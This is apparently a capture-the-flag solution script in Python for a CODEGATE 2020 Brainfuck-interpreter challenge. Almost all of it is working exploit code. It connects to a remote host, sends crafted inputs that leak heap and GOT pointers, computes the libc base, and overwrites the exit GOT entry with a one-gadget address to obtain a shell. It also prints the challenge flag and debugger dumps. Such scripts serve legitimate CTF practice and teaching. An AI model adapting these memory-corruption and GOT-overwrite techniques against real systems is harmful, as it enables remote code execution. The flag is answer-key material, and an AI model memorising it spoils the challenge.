#!/usr/bin/env python
from pwn import *

# flag = CODEGATE2020{next_time_i_should_make_a_backend_for_bf_as_well}
context.arch = 'amd64'

libc = ELF('./libc.so.6')
r = remote('58.229.240.181', 7777)

leak = ''
for i in reversed(range(3, 8+1)):
    r.sendlineafter('>>> ', '+[{}[.{}]]'.format('<'*i, '>'*(i+1)))
    leak += r.recvn(1)

heap = u64(leak+'\0\0')
print hex(heap)

# dptr & sptr will be refreshed everytime (but keep the same)
# sptr only used for sanity check, dptr will be updated after every '<','>'
# '-'*0x80 since we moved there (0x980)
# higher byte of pointers equal to zero, so execution will jump out from ']'
r.sendlineafter('>>> ', '+[<<<<<<<<[{}<<<<<<<<{}{}]]'.format('-'*0x90, '-'*0x80, '.>'*0x50))

leak = r.recvn(0x50)

got_table = [u64(leak[i*8:i*8+8]) for i in range(len(leak)/8)]

libc.address = got_table[3] - libc.symbols['write']
print hex(libc.address)
magic = libc.address + 0x10a38c

r.sendlineafter('>>> ', '+[<<<<<<<<[{}<<<<<<<<{}{}]]'.format('-'*0x90, '-'*0x40, ',>'*0x6))

# write to exit GOT
for i in range(6):
    r.send(p64(magic)[i])

# just make it fail
r.sendlineafter('>>> ', '<+')
r.interactive()

'''
gef>  x/10gx 0x00007ffff0d9d000
0x7ffff0d9d000: 0x0000000000200e10      0x0000000000d9a3f0
0x7ffff0d9d010: 0x00007ffff7dec680      0x00007ffff7af4140
0x7ffff0d9d020: 0x00007ffff0b9c7b6      0x00007ffff7b72f50
0x7ffff0d9d030: 0x00007ffff0b9c7d6      0x00007ffff0b9c7e6
0x7ffff0d9d040: 0x00007ffff0b9c7f6      0x00007ffff0d9d048
'''
'''
.got.plt:0000000000201000 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
.got.plt:0000000000201008 qword_201008    dq 0
.got.plt:0000000000201010 qword_201010    dq 0
.got.plt:0000000000201018 off_201018      dq offset write
.got.plt:0000000000201020 off_201020      dq offset __stack_chk_fail
.got.plt:0000000000201028 off_201028      dq offset memset
.got.plt:0000000000201030 off_201030      dq offset read
.got.plt:0000000000201038 off_201038      dq offset fprintf
.got.plt:0000000000201040 off_201040      dq offset exit
.got.plt:0000000000201040 _got_plt        ends
'''
